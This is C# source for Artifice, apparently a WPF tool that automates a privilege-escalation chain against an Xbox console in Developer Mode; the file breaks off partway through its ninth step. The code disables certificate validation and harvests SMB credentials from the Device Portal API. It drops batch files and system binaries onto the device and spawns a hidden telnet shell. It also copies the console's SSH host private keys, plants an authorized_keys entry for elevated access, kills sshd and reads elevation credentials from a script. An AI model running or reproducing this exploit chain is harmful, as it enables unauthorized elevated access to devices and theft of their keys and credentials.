using HandyControl.Controls;
using Newtonsoft.Json;
using Ookii.Dialogs.Wpf;
using System;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Artifice.Controls.Dialogs;
using System.IO;
using Renci.SshNet;
using Renci.SshNet.Security;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using PrimS.Telnet;
using Renci.SshNet.Common;
using System.Windows.Documents;
using static Artifice.Helpers;

namespace Artifice
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : GlowWindow
    {
        private readonly Log _log;
        public StepViewModel ViewModel { get; set; }
        public bool HasWdpCredentials { get; set; }

        private static ShareCredentials _shareCredentials;
        public static ShareCredentials ShareCredentials
        {
            get => _shareCredentials;
            set => _shareCredentials = value;
        }

        private static WDPCredentials _wdpCredentials;
        public static WDPCredentials WDPCredentials
        {
            get => _wdpCredentials;
            set => _wdpCredentials = value;
        }

        public MainWindow()
        {
            InitializeComponent();
            XSVGPath.Visibility = Visibility.Hidden;
            ViewModel = new StepViewModel();
            DataContext = ViewModel;
            _log = new Log(MyRichTextBox);

            _ = _log.DebugAsync("𝗔𝗥𝗧𝗜𝗙𝗜𝗖𝗘 𝗜𝗡𝗜𝗧𝗜𝗔𝗟𝗜𝗭𝗘𝗗");
        }

        public async Task StepOne()
        {
            string hostnameOrIpAddress;

            var credSwitchHelper = new CredSwitch();
            credSwitchHelper.ShowCredentialDialog(CredSwitch);

            var inputDialog = new InputDialog("Enter Hostname/IP Address", "Hostname/IP Address")
            {
                Owner = Application.Current.MainWindow,
                WindowStartupLocation = WindowStartupLocation.CenterOwner
            };

            inputDialog.ShowDialog();
            hostnameOrIpAddress = inputDialog.Result;

            // Check if the user clicked the cancel button
            if (inputDialog.Result == null)
            {
                return;
            }

            if (!IPAddress.TryParse(hostnameOrIpAddress, out _))
            {
                IPHostEntry hostEntry = Dns.GetHostEntry(hostnameOrIpAddress);
                IPAddress[] addresses = hostEntry.AddressList;
                foreach (IPAddress address in addresses)
                {
                    if (address.ToString().StartsWith("192.168."))
                    {
                        hostnameOrIpAddress = address.ToString();
                        await _log.InformationAsync($"Hostname IP resolved");
                        break;
                    }
                }
            }

            // Quick task to avoid error 1219
            var netClear = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $@"/C net use \\{hostnameOrIpAddress}\DevelopmentFiles /delete /y",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = Process.Start(netClear);
            process.WaitForExit();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            if (!string.IsNullOrEmpty(error))
                Debug.WriteLine(error);

            var baseAddress = $"https://{hostnameOrIpAddress}:11443";
            var endpoint = "/ext/smb/developerfolder";

            // Create an instance of HttpClient with a custom handler
            // WDP's cert-chain gets caught out, so we'll bypass normal validation
            // Disallow AutoRedirect to catch the 307
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true;
            handler.AllowAutoRedirect = false;

            using (var client = new HttpClient(handler) { BaseAddress = new Uri(baseAddress) })
            {
                var response = await client.GetAsync(endpoint);

                // Handle non-provisioned 307
                if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
                {
                    await _log.ErrorAsync("Credentials not setup in DevHome");
                    await _log.ErrorAsync("Please add them or disable authorization");
                    return;
                }

                if (response.StatusCode == HttpStatusCode.Unauthorized)
                {
                    await _log.ErrorAsync($"{response.StatusCode}");

                    var dialog = new CredentialDialog
                    {
                        MainInstruction = "Please enter your credentials",
                        Content = "The API requires authentication. Please enter your username and password.",
                        Target = "Artifice_WDP",
                        ShowSaveCheckBox = true,
                        ShowUIForSavedCredentials = true
                    };

                    if (dialog.ShowDialog() == true)
                    {
                        var username = dialog.UserName;
                        var password = dialog.Password;

                        WDPCredentials = new WDPCredentials(username, password);

                        var byteArray = Encoding.ASCII.GetBytes($"{username}:{password}");
                        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", Convert.ToBase64String(byteArray));
                        response = await client.GetAsync(endpoint);
                        dialog.ConfirmCredentials(true);

                        HasWdpCredentials = true;
                    }
                }

                if (response.IsSuccessStatusCode)
                {
                    await _log.InformationAsync("Connected to the API");
                    var json = await response.Content.ReadAsStringAsync();
                    dynamic result = JsonConvert.DeserializeObject(json);

                    string path = $@"\\{hostnameOrIpAddress}\DevelopmentFiles";
                    string username = result.Username;
                    string password = result.Password;

                    await _log.InformationAsync("Retrieved SMB credentials");

                    ShareCredentials = new ShareCredentials(hostnameOrIpAddress, path, username, password);
                    var connectResult = NetworkShare.ConnectToShare(ShareCredentials.Path, ShareCredentials.Username, ShareCredentials.Password);

                    if (connectResult == 0)
                    {
                        await _log.InformationAsync("Connected to network share");
                    }

                    else
                    {
                        await _log.ErrorAsync($"Failed to connect to network share: {connectResult}");
                    }

                    StepViewModel viewModel = ViewModel;
                    viewModel.NextStep();
                    await StepTwo();
                }
            }
        }

        public async Task StepTwo()
        {
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;

            var workingDirectory = Directory.GetCurrentDirectory();
            var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");
            var MsixPath = Path.Combine(workingDirectory, "Scratch", "art.msix");
            var dependenciesPath = Path.Combine(workingDirectory, "Scratch", "dependencies");

            string installCommand =
                $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:install /appx:{MsixPath}";

            string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
            string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

            await _log.InformationAsync($"Installing art.msix");
            XSVGPath.Visibility = Visibility.Visible;

            if (Directory.Exists(dependenciesPath))
            {
                var dependencies = Directory.GetFiles(dependenciesPath);
                if (dependencies.Length > 0)
                {
                    installCommand += $" /depend:{string.Join(";", dependencies)}";
                }
            }

            if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
            {
                installCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
            }

            var processStartInfo = new ProcessStartInfo("cmd", $"/c {installCommand}")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(processStartInfo);
            var tcs = new TaskCompletionSource<bool>();

            process.Exited += (sender, e) => tcs.SetResult(true);
            process.EnableRaisingEvents = true;

            await tcs.Task;
            string installOutput = process.StandardOutput.ReadToEnd();

            if (installOutput.Contains("Install complete."))
            {
                await _log.InformationAsync("Installed art.msix");
            }

            else
            {
                await _log.ErrorAsync($"{installOutput}");
            }

            XSVGPath.Visibility = Visibility.Hidden;

            StepViewModel viewModel = ViewModel;
            viewModel.NextStep();
            await StepThree();
        }

        public async Task StepThree()
        {
            var host = ShareCredentials.HostnameOrIpAddress;
            SshClient ssh = new SshClient(host, ShareCredentials.Username, ShareCredentials.Password);
            await _log.InformationAsync("Setting up SSH");

            ssh.Connect();

            await TransferFiles(ssh);
            await LaunchApp();
            await StartTelnet(ssh);
            await CopySSHFiles();
            await DropSSHFiles(ssh);

            ssh.Disconnect();
            ssh.Dispose();

            StepViewModel vm = ViewModel;
            vm.NextStep();

            await StepFour();

            async Task TransferFiles(SshClient ssh)
            {
                string srcDir = Path.Combine(Directory.GetCurrentDirectory(), "Scratch");
                string destDir = ShareCredentials.Path;

                string[] batchFiles = ["acl.bat", "acl2.bat", "allclean.bat", "veil.bat"];
                string[] rootFiles = ["icacls.exe", "net1.exe"];

                foreach (string file in batchFiles)
                {
                    string srcPath = Path.Combine(srcDir, "Batch", file);
                    string destPath = Path.Combine(destDir, file);

                    File.Copy(srcPath, destPath, true);
                }

                foreach (string file in rootFiles)
                {
                    string srcPath = Path.Combine(srcDir, file);
                    string destPath = Path.Combine(destDir, file);

                    File.Copy(srcPath, destPath, true);
                }

                string srcFolder = Path.Combine(srcDir, "en-us");
                string destFolder = Path.Combine(destDir, "en-us");

                if (Directory.Exists(destFolder))
                {
                    Directory.Delete(destFolder, true);
                }

                Directory.CreateDirectory(destFolder);

                string fileName = "ICacls.exe.mui";

                string srcFilePath = Path.Combine(srcFolder, fileName);
                string destFilePath = Path.Combine(destFolder, fileName);

                File.Copy(srcFilePath, destFilePath, true);
            }

            async Task LaunchApp()
            {
                var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;
                var username = ShareCredentials.Username;
                var password = ShareCredentials.Password;

                SshClient sshClient = new SshClient(hostnameOrIp, username, password);
                sshClient.Connect();
                sshClient.RunCommand(@"cmd /c echo. > d:\SSH1.txt");

                var workingDirectory = Directory.GetCurrentDirectory();
                var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");
                var pfn = "Artifice_1.0.0.0_x64__s9y1p3hwd5qda";
                var aumid = "Artifice_s9y1p3hwd5qda!App";

                string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
                string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

                string command = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:launch /pfn:{pfn} /aumid:{aumid}";
                if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                {
                    command += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                }

                var processStartInfo = new ProcessStartInfo("cmd", $"/c {command}")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = Process.Start(processStartInfo);
                var tcs = new TaskCompletionSource<bool>();

                process.Exited += (sender, e) => tcs.SetResult(true);
                process.EnableRaisingEvents = true;

                await tcs.Task;
                string output = process.StandardOutput.ReadToEnd();

                if (output.Contains("Application launched."))
                {
                    await _log.InformationAsync("Launched app");
                }

                else
                {
                    await _log.ErrorAsync($"{output}");

                    string checkCommand =
                        @"cmd.exe /c IF EXIST D:\DevelopmentFiles\WindowsApps\Artifice_1.0.0.0_x64__s9y1p3hwd5qda (echo true) ELSE (echo false)";

                    var checkResult = sshClient.RunCommand(checkCommand);

                    if (checkResult.Result.Contains("true"))
                    {
                        sshClient.RunCommand(@"cmd /c d:\developmentfiles\allclean.bat");

                        await _log.WarningAsync("Uninstalling app");

                        string uninstallCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:uninstall /pfn:{pfn}";
                        if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                        {
                            uninstallCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                        }

                        var processStartUninstall = new ProcessStartInfo("cmd", $"/c {uninstallCommand}")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        var uninstallProcess = Process.Start(processStartUninstall);
                        var tcsUninstall = new TaskCompletionSource<bool>();

                        uninstallProcess.Exited += (sender, e) =>
                        {
                            if (!tcsUninstall.Task.IsCompleted)
                            {
                                tcsUninstall.SetResult(true);
                            }
                        };

                        uninstallProcess.EnableRaisingEvents = true;

                        await tcsUninstall.Task;
                        string outputUninstall = uninstallProcess.StandardOutput.ReadToEnd();

                        if (outputUninstall.Contains("Application uninstalled."))
                        {
                            await _log.InformationAsync("Uninstalled app");
                        }

                        else
                        {
                            await _log.ErrorAsync($"{outputUninstall}");
                            return;
                        }

                        MessageBoxResult result =
                            HandyControl.Controls.MessageBox.Show("Restart Console?", "Restart", MessageBoxButton.YesNo);

                        if (result == MessageBoxResult.Yes)
                        {
                            string rebootCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:reboot";
                            if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                            {
                                rebootCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                            }

                            var processStartRestart = new ProcessStartInfo("cmd", $"/c {rebootCommand}")
                            {
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            var restart = Process.Start(processStartRestart);
                            var tcsRestart = new TaskCompletionSource<bool>();

                            restart.Exited += (sender, e) =>
                            {
                                if (!tcsRestart.Task.IsCompleted)
                                {
                                    tcsRestart.SetResult(true);
                                }
                            };

                            restart.EnableRaisingEvents = true;

                            await tcsRestart.Task;
                            string rebootOutput = restart.StandardOutput.ReadToEnd();

                            if (rebootOutput.Contains("Rebooting device."))
                            {
                                await _log.InformationAsync("Initiated reboot of the console");
                                await Task.Delay(3000);

                                StepViewModel VM = ViewModel;
                                VM.StepIndex = 0;
                                MyRichTextBox.Document = new FlowDocument();

                                await StepOne();
                                return;
                            }

                            else
                            {
                                await _log.ErrorAsync($"{rebootOutput}");
                                return;
                            }
                        }
                    }

                    sshClient.Disconnect();
                    sshClient.Dispose();
                    return;
                }

                sshClient.Disconnect();
            }

            async Task StartTelnet(SshClient ssh)
            {
                ssh.RunCommand(@"devtoolslauncher LaunchForProfiling telnetd ""cmd.exe 24""");
                await _log.InformationAsync($"Telnet session created");
            }

            async Task CopySSHFiles()
            {
                string srcDir = Path.Combine(ShareCredentials.Path, "artssh");
                string destDir = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "SSHDump");

                Directory.CreateDirectory(destDir);
                string[] sshFiles = Directory.GetFiles(srcDir, "ssh*");

                foreach (string sshFile in sshFiles)
                {
                    string fileName = Path.GetFileName(sshFile);
                    string destPath = Path.Combine(destDir, fileName);
                    File.Copy(sshFile, destPath, true);
                }

                await _log.InformationAsync($"Copied SSH files");
            }

            async Task DropSSHFiles(SshClient ssh)
            {
                string srcSSHDir = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "SSH");
                string destSSHDir = Path.Combine(ShareCredentials.Path, "SSH");

                if (Directory.Exists(destSSHDir))
                {
                    Directory.Delete(destSSHDir, true);
                }

                Directory.CreateDirectory(destSSHDir);

                string[] sshFiles = ["elevate.cmd", "sshd_config"];
                string clean = @"rmdir /S /Q d:\developmentfiles\artssh & rmdir /S /Q d:\temp";

                foreach (string sshFile in sshFiles)
                {
                    string srcPath = Path.Combine(srcSSHDir, sshFile);
                    string destPath = Path.Combine(destSSHDir, sshFile);
                    File.Copy(srcPath, destPath, true);
                }

                await _log.InformationAsync("Dropped SSH files");
                ssh.RunCommand(clean);
            }
        }

        public async Task StepFour()
        {
            string destinationPath = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "SSHDump", "ssh_host_ed25519_key");

            // Load the private key
            PrivateKeyFile privateKeyFile = new PrivateKeyFile(destinationPath);
            KeyHostAlgorithm privateKey = (KeyHostAlgorithm)privateKeyFile.HostKey;

            // Get the public key data from the private key
            byte[] publicKeyData = privateKey.Data;
            string publicKeyBase64 = Convert.ToBase64String(publicKeyData);
            string authorizedKeysEntry = $"ssh-ed25519 {publicKeyBase64} system@artifice";
            string authKeysPath = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "AuthKeys");

            // Save the authorized_keys file
            if (!Directory.Exists(authKeysPath))
            {
                Directory.CreateDirectory(authKeysPath);
            }

            File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "AuthKeys", "authorized_keys"), authorizedKeysEntry);
            await _log.InformationAsync($"Created public key");

            StepViewModel viewModel = ViewModel;
            viewModel.NextStep();
            await StepFive();
        }

        public async Task StepFive()
        {
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;
            var username = ShareCredentials.Username;
            var password = ShareCredentials.Password;

            SshClient sshClient = new SshClient(hostnameOrIp, username, password);
            sshClient.Connect();

            var workingDirectory = Directory.GetCurrentDirectory();
            var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");
            var pfn = "Artifice_1.0.0.0_x64__s9y1p3hwd5qda";
            var aumid = "Artifice_s9y1p3hwd5qda!App";

            string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
            string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

            string command = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:launch /pfn:{pfn} /aumid:{aumid}";
            if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
            {
                command += $" /user:{wdpUsername} /pwd:{wdpPassword}";
            }

            var processStartInfo = new ProcessStartInfo("cmd", $"/c {command}")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(processStartInfo);
            var tcs = new TaskCompletionSource<bool>();

            process.Exited += (sender, e) => tcs.SetResult(true);
            process.EnableRaisingEvents = true;

            await tcs.Task;
            string output = process.StandardOutput.ReadToEnd();

            if (output.Contains("Application launched."))
            {
                await _log.InformationAsync("Launched app");
            }

            else
            {
                await _log.ErrorAsync($"{output}");

                string checkCommand =
                    @"cmd.exe /c IF EXIST D:\DevelopmentFiles\WindowsApps\Artifice_1.0.0.0_x64__s9y1p3hwd5qda (echo true) ELSE (echo false)";

                var checkResult = sshClient.RunCommand(checkCommand);

                if (checkResult.Result.Contains("true"))
                {
                    sshClient.RunCommand(@"cmd /c d:\developmentfiles\allclean.bat");

                    await _log.WarningAsync("Uninstalling app");

                    string uninstallCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:uninstall /pfn:{pfn}";
                    if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                    {
                        uninstallCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                    }

                    var processStartUninstall = new ProcessStartInfo("cmd", $"/c {uninstallCommand}")
                    {
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    var uninstallProcess = Process.Start(processStartUninstall);
                    var tcsUninstall = new TaskCompletionSource<bool>();

                    uninstallProcess.Exited += (sender, e) =>
                    {
                        if (!tcsUninstall.Task.IsCompleted)
                        {
                            tcsUninstall.SetResult(true);
                        }
                    };

                    uninstallProcess.EnableRaisingEvents = true;

                    await tcsUninstall.Task;
                    string outputUninstall = uninstallProcess.StandardOutput.ReadToEnd();

                    if (outputUninstall.Contains("Application uninstalled."))
                    {
                        await _log.InformationAsync("Uninstalled app");
                    }

                    else
                    {
                        await _log.ErrorAsync($"{outputUninstall}");
                        return;
                    }

                    MessageBoxResult result =
                        HandyControl.Controls.MessageBox.Show("Restart Console?", "Restart", MessageBoxButton.YesNo);

                    if (result == MessageBoxResult.Yes)
                    {
                        string rebootCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:reboot";
                        if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                        {
                            rebootCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                        }

                        var processStartRestart = new ProcessStartInfo("cmd", $"/c {rebootCommand}")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        var restart = Process.Start(processStartRestart);
                        var tcsRestart = new TaskCompletionSource<bool>();

                        restart.Exited += (sender, e) =>
                        {
                            if (!tcsRestart.Task.IsCompleted)
                            {
                                tcsRestart.SetResult(true);
                            }
                        };

                        restart.EnableRaisingEvents = true;

                        await tcsRestart.Task;
                        string rebootOutput = restart.StandardOutput.ReadToEnd();

                        if (rebootOutput.Contains("Rebooting device."))
                        {
                            await _log.InformationAsync("Initiated reboot of the console");
                            await Task.Delay(3000);

                            StepViewModel VM = ViewModel;
                            VM.StepIndex = 0;
                            MyRichTextBox.Document = new FlowDocument();

                            await StepOne();
                            return;
                        }

                        else
                        {
                            await _log.ErrorAsync($"{rebootOutput}");
                            return;
                        }
                    }
                }

                sshClient.Disconnect();
                sshClient.Dispose();
                return;
            }

            bool fileExists = false;
            while (!fileExists)
            {
                var result = sshClient.RunCommand("if exist D:\\success.txt (echo true) else (echo false)");
                fileExists = result.Result.Trim() == "true";
                await Task.Delay(250);
            }

            sshClient.Disconnect();
            sshClient.Dispose();

            await _log.InformationAsync("Success file found");

            StepViewModel viewModel = ViewModel;
            viewModel.NextStep();
            await StepSix();
        }

        public async Task StepSix()
        {
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;

            var workingDirectory = Directory.GetCurrentDirectory();
            var authKeysPath = Path.Combine(workingDirectory, "Scratch", "AuthKeys");
            var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");
            var pfn = "Artifice_1.0.0.0_x64__s9y1p3hwd5qda";
            var aumid = "Artifice_s9y1p3hwd5qda!App";

            string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
            string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

            SshClient sshClient = new SshClient(hostnameOrIp, ShareCredentials.Username, ShareCredentials.Password);
            sshClient.Connect();

            await _log.InformationAsync("Preparing arbitrary write");

            sshClient.RunCommand(@"cmd /c mkdir D:\DevelopmentFiles\SSH2");
            await _log.InformationAsync("Created SSH2 directory");

            string srcDir = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "AuthKeys");
            string destDir = ShareCredentials.Path + "\\SSH2";

            string[] files = Directory.GetFiles(srcDir);

            foreach (string file in files)
            {
                string fileName = Path.GetFileName(file);
                string destPath = Path.Combine(destDir, fileName);
                File.Copy(file, destPath, true);
            }

            await _log.InformationAsync("Successfully copied files");

            sshClient.RunCommand(@"cmd /c d:\developmentfiles\acl2.bat");
            sshClient.RunCommand(@"cmd /c echo. > d:\SSH2.txt");

            await _log.InformationAsync("Relaunching app");
            string launchCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:launch /pfn:{pfn} /aumid:{aumid}";

            if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
            {
                launchCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
            }

            var processStartFallback = new ProcessStartInfo("cmd", $"/c {launchCommand}")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var fallbackProcess = Process.Start(processStartFallback);
            var tcsFallBack = new TaskCompletionSource<bool>();

            fallbackProcess.Exited += (sender, e) =>
            {
                if (!tcsFallBack.Task.IsCompleted)
                {
                    tcsFallBack.SetResult(true);
                }
            };

            fallbackProcess.EnableRaisingEvents = true;

            await tcsFallBack.Task;
            string outputFallback = fallbackProcess.StandardOutput.ReadToEnd();

            bool isSuccessful = false;

            if (outputFallback.Contains("Application launched."))
            {
                string checkFallbackSuccess = @"cmd.exe /c IF EXIST D:\SSH2Success.txt (echo true) ELSE (echo false)";
                var checkSuccessResult = sshClient.RunCommand(checkFallbackSuccess);

                if (checkSuccessResult.Result.Contains("true"))
                {
                    await _log.InformationAsync("Executed arbitrary write");
                    isSuccessful = true;
                }
            }

            else
            {
                await _log.ErrorAsync($"{outputFallback}");
            }

            if (!isSuccessful)
            {
                return;
            }

            await _log.InformationAsync("Completed arbitrary write");

            sshClient.Disconnect();
            sshClient.Dispose();

            StepViewModel viewModel = ViewModel;
            viewModel.NextStep();
            await StepSeven();
        }

        public async Task StepSeven()
        {
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;

            await _log.InformationAsync("Setting up SSH");

            var workingDirectory = Directory.GetCurrentDirectory();
            var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");
            var pfn = "Artifice_1.0.0.0_x64__s9y1p3hwd5qda";
            var aumid = "Artifice_s9y1p3hwd5qda!App";

            string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
            string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

            using (SshClient sshClient = new SshClient(hostnameOrIp, ShareCredentials.Username, ShareCredentials.Password))
            {
                sshClient.Connect();

                if (sshClient.IsConnected)
                {
                    Debug.WriteLine("SSH connection established");
                    sshClient.RunCommand(@"cmd /c d:\developmentfiles\acl.bat");

                    await _log.InformationAsync("ACL permissions fixed");
                    await _log.InformationAsync("Relaunching app");
                    string launchCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:launch /pfn:{pfn} /aumid:{aumid}";

                    if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                    {
                        launchCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                    }

                    var processStartInfo = new ProcessStartInfo("cmd", $"/c {launchCommand}")
                    {
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    var process = Process.Start(processStartInfo);
                    var tcs = new TaskCompletionSource<bool>();

                    process.Exited += (sender, e) => tcs.SetResult(true);
                    process.EnableRaisingEvents = true;

                    await tcs.Task;
                    string output = process.StandardOutput.ReadToEnd();

                    if (output.Contains("Application launched."))
                    {
                        await _log.InformationAsync("Launched app");
                    }

                    else
                    {
                        await _log.ErrorAsync($"{output}");
                    }

                    await _log.InformationAsync("SSH copy finished");
                }

                else
                {
                    Debug.WriteLine("SSH connection not established");
                }

                // Quick cleanup before we uninstall
                await _log.InformationAsync("Performing cleanup");

                sshClient.RunCommand(@"cmd /c d:\developmentfiles\allclean.bat");
                sshClient.RunCommand(@"cmd /c del d:\developmentfiles\allclean.bat");
                sshClient.Disconnect();

                // Both recursiveCopy operations are complete, uninstall the app
                string command2 = $"{ xboxWdpDriverPath} /x:{hostnameOrIp} /op:app /subop:uninstall /pfn:{pfn}";
                if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                {
                    command2 += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                }

                var processStartInfo2 = new ProcessStartInfo("cmd", $"/c {command2}")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process2 = Process.Start(processStartInfo2);
                process2.WaitForExit();
                string output2 = process2.StandardOutput.ReadToEnd();

                if (output2.Contains("Application uninstalled."))
                {
                    await _log.InformationAsync("Uninstalled app");
                }

                else
                {
                    await _log.ErrorAsync($"{output2}");
                }

                StepViewModel viewModel = ViewModel;
                viewModel.NextStep();
                await StepEight();
            }
        }

        public async Task StepEight()
        {
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;

            var workingDirectory = Directory.GetCurrentDirectory();
            var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");

            string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
            string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

            using (Client telnetClient = new Client(hostnameOrIp, 24, new CancellationToken()))
            {
                if (telnetClient.IsConnected)
                {
                    Debug.WriteLine("Telnet connection established");
                    await _log.InformationAsync("Telnet connection established");

                    string shellPrompt = await telnetClient.TerminatedReadAsync("C:\\Windows\\System32>", TimeSpan.FromSeconds(5));

                    // tlist -s allows us to find the correct svchost (SshdBroker)
                    // tlist -v works too, but requires more parsing from the output
                    await telnetClient.WriteLineRfc854Async("tlist -s");
                    await _log.InformationAsync("Parsing process list");

                    string output = await telnetClient.ReadAsync(TimeSpan.FromSeconds(10));

                    // Parse the output to get the PIDs of the processes to terminate
                    // Manual parsing since we don't have the luxury of findstr
                    string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (string line in lines)
                    {
                        // Be aware of case-sensitivity here for proc names
                        string processName = "";
                        if (line.Contains("svchost.exe") && line.Contains("SshdBroker")) processName = "svchost.exe";
                        else if (line.Contains("sshd.exe")) processName = "sshd.exe";

                        if (!string.IsNullOrEmpty(processName))
                        {
                            string[] parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                            if (int.TryParse(parts[0], out int pid))
                            {
                                string terminateCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:terminateprocess /pid:{pid}";
                                if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                                {
                                    terminateCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                                }

                                var processStartInfo = new ProcessStartInfo("cmd", $"/c {terminateCommand}")
                                {
                                    RedirectStandardOutput = true,
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };

                                var process = Process.Start(processStartInfo);
                                var tcs = new TaskCompletionSource<bool>();

                                process.Exited += (sender, e) => tcs.SetResult(true);
                                process.EnableRaisingEvents = true;

                                await tcs.Task;
                                string terminateOutput = process.StandardOutput.ReadToEnd();

                                if (terminateOutput.Contains($"Terminated process with ID {pid}"))
                                {
                                    await _log.InformationAsync($"Terminated {processName} process with PID {pid}");
                                }

                                else
                                {
                                    await _log.InformationAsync($"Failed to terminate {processName} process with PID {pid}");
                                }
                            }

                            else
                            {
                                Debug.WriteLine($"Failed to parse PID from line: {line}");
                            }
                        }
                    }
                }

                else
                {
                    Debug.WriteLine("Telnet connection not established");
                }

                await _log.InformationAsync("Cycled SSH");

                telnetClient.Dispose();

                StepViewModel viewModel = ViewModel;
                viewModel.NextStep();
                await StepNine();
            }
        }

        public async Task StepNine()
        {
            // Read the credentials from "elevate.cmd"
            string currentDirectory = Directory.GetCurrentDirectory();
            string elevateCmdPath = Path.Combine(currentDirectory, @"scratch\SSH\elevate.cmd");
            string[] elevateLines = File.ReadAllLines(elevateCmdPath);

            // Parse the second line to extract the username and password
            string[] parts = elevateLines[1].Split(' ');
            string elevateUser = parts[2];
            string elevatePass = parts[3];

            await _log.WarningAsync("Entering Sshd waiting period (approx 1min)");

            XSVGPath.Visibility = Visibility.Visible;
            var hostnameOrIp = ShareCredentials.HostnameOrIpAddress;

            using (Client telnetClient = new Client(hostnameOrIp, 24, new CancellationToken()))
